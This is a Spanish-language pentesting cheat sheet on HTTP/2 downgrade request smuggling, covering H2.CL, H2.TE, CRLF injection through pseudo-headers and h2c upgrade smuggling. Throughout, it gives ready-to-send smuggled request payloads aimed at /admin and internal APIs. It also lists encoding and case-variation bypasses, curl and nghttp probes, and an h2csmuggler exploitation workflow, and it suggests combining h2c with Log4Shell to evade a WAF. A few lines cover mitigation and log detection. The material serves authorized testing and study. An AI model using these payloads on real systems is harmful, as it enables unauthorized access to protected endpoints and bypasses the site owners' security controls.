---
aliases:
  - H2.CL
  - H2.TE
  - HTTP/2 Smuggling
  - H2 Desync
  - h2cSmuggling
tags:
  - type/cheatsheet
  - vuln/http-smuggling
  - technique/initial-access
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[HTTP Request Smuggling]]'
---
# HTTP Request Smuggling - HTTP/2 Downgrade

***

## H2.CL (HTTP/2 → HTTP/1.1 + Content-Length)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Concepto | Frontend habla H2, backend H1. Frontend traduce H2 → H1 y conserva el header `content-length` del request H2. Si CL no matchea body real → desync. | RFC 7540 dice que CL en H2 es informativa — frontend ingenuo la mantiene. |
| Setup en Burp | Repeater → Inspector → "Request smuggling" → tipo H2.CL | Burp arma H2 raw frame. |
| Header H2 a inyectar | `content-length: 0` + body de N bytes con smuggled request | Backend H1 lee CL=0 → resto del body queda como nueva request. |
| Smuggle GET | `content-length: 0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target\r\n\r\n` | Body real ignorado por back. |
| Bypass de body length | H2 frame Length se ignora si CL header se mantiene en downgrade. | Crítico — frontend "trustea" el CL declarado. |
| Burp HTTP/2 Probe | Auto-detecta esto con request smuggler ext | Recomendado. |
| Servidores afectados (CVE históricos) | F5 BIG-IP, Imperva, Akamai, Netflix Zuul, AWS ALB, varios CDN | Patches 2021-2022. |
| Mitigación frontend | Re-calcular CL en downgrade — descartar el header del cliente | Best practice post-Kettle research. |
^hrs-h2-cl

### Stylesheet H2.CL

```
HTTP/2 request frame:
:method: POST
:path: /
:scheme: https
:authority: target.com
content-length: 0

[BODY BYTES]
GPOST /admin HTTP/1.1
Host: target.com
Content-Length: 10

x=evilbody
```

Frontend reescribe a H1 con `Content-Length: 0` (declarado). Backend H1 procesa request principal (CL=0, body vacío). Bytes posteriores al body "vacío" quedan en queue → próxima request del back es la smuggled `GPOST /admin`.

___

## H2.TE (HTTP/2 → HTTP/1.1 + Transfer-Encoding)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Concepto | RFC 7540 §8.1.2.2 prohíbe `Transfer-Encoding` en H2. Frontend conformante rejecta. Frontend laxo lo forwarda al H1 backend → backend usa TE → desync. | Vector frequente porque devs olvidan validar. |
| Setup | H2 request con header `transfer-encoding: chunked` | RFC viola — pero la frontera reenvía. |
| Smuggle estructura | `transfer-encoding: chunked\r\n\r\n0\r\n\r\nSMUGGLED REQ` | Backend H1 lee chunked → terminator `0\r\n\r\n` → resto queda en buffer. |
| Probe rápido | `nghttp -v -H 'transfer-encoding: chunked' https://target/` | Si frontend forwarda → vulnerable. |
| Combine con CL inválido | `content-length: 999\r\ntransfer-encoding: chunked` | RFC dice ignorar CL si TE presente. Algunos backends honran ambos. |
| Servidores afectados | nginx <1.21.1, Apache (configs), HAProxy <2.0, Cloudflare (parchado) | Public CVEs. |
| Bypass case-sensitive | `Transfer-Encoding` vs `transfer-encoding` vs `TRANSFER-ENCODING` | H2 normaliza lowercase, H1 case-insensitive — frontend puede confundirse. |
| Detection en logs | Logs del backend muestran request "GPOST" o paths raros | Indicador residual. |
^hrs-h2-te

___

## H2 Request Line Injection (CRLF en pseudo-headers)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Concepto | Pseudo-headers H2 (`:method`, `:path`, `:authority`, `:scheme`) se traducen a request line en H1. Si frontend no sanitiza CRLF en value → inyección de líneas H1 enteras. | Vector "request line injection". |
| Inject path | `:path: /foo HTTP/1.1\r\nHost: target\r\nX-Smuggle: 1\r\n\r\nGET /admin HTTP/1.1\r\nHost: target\r\n\r\n` | Después de translate, queda como múltiples request lines H1. |
| Inject method | `:method: GET / HTTP/1.1\r\nHost:` | Misma idea, vector método. |
| Inject authority | `:authority: target\r\nFoo: x` | Si fronted manda como `Host:`, el `\r\n` separa. |
| Bypass de sanitización | Encoding URL `%0d%0a` en lugar de `\r\n` literal | Algunos frontends decodean URL antes de validar — bypass. |
| Bypass UTF-8 raro | `
` con encoding distinto | Edge case parsers. |
| Burp inspector edit | Pseudo-headers panel → editar manualmente con CRLF | Single-tool workflow. |
| HEAD-based smuggle | `:method: HEAD\r\n` con \r\n en method | Mismo vector. |
^hrs-h2-request-line

### Stylesheet request line injection

```
HTTP/2 frame:
:method: GET
:path: /foo HTTP/1.1\r\nHost: target.com\r\nX: x\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n
:scheme: https
:authority: target.com
```

Frontend traduce a H1:
```
GET /foo HTTP/1.1
Host: target.com
X: x

GET /admin HTTP/1.1
Host: target.com

```

Backend recibe **2 requests** — segunda es la smuggleada.

___

## H2 Pseudo-Header Injection / h2c Smuggling

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| h2c upgrade smuggle | Request HTTP/1.1 con `Connection: Upgrade, HTTP2-Settings\r\nUpgrade: h2c\r\nHTTP2-Settings: <base64>` | Si backend acepta upgrade pero frontend no inspecciona, abrir túnel H2 directo al back bypassing front controls. |
| h2cSmuggler tool | `h2csmuggler -x https://victim/ -X "GET /admin HTTP/1.1\r\nHost: victim\r\n\r\n"` | Auto-explota. |
| Header `:authority` injection | `:authority: target1.com,target2.com` | Header smuggling para alcanzar virtual hosts internos. |
| Header `:scheme` confusion | `:scheme: javascript` | Backend laxo puede ejecutar como path. |
| Forbidden pseudo-headers | Inyectar `:status: 200` en request | Algunos backends laxos lo aceptan y pasan por upstream. |
| `Connection: keep-alive, X-Custom` | Headers hop-by-hop arbitrarios | Bypass de header allowlists. |
| h2c via TLS upgrade | `Upgrade: h2c` aún sobre HTTPS | Frontend que decapsula TLS y pasa h1 al back puede aceptar upgrade. |
| Log4Shell + h2c | h2c bypass + JNDI injection | Combo CVE-2021-44228 con bypass de WAF. |
^hrs-h2-pseudo-header

### h2cSmuggler workflow

```bash
# 1. Detectar si h2c upgrade es aceptado
curl -v -H "Connection: Upgrade, HTTP2-Settings" \
     -H "HTTP2-Settings: AAEAAEAAAAIAAAABAAMAAABkAAQBAAAAAAUAAEAA" \
     -H "Upgrade: h2c" \
     https://target/

# Si responde 101 Switching Protocols → vulnerable

# 2. Explotar
git clone https://github.com/BishopFox/h2csmuggler && cd h2csmuggler
python3 h2csmuggler.py -x https://target/ -X /admin

# 3. Acceder a endpoints internos
python3 h2csmuggler.py -x https://target/ -X /api/internal/users
```

***
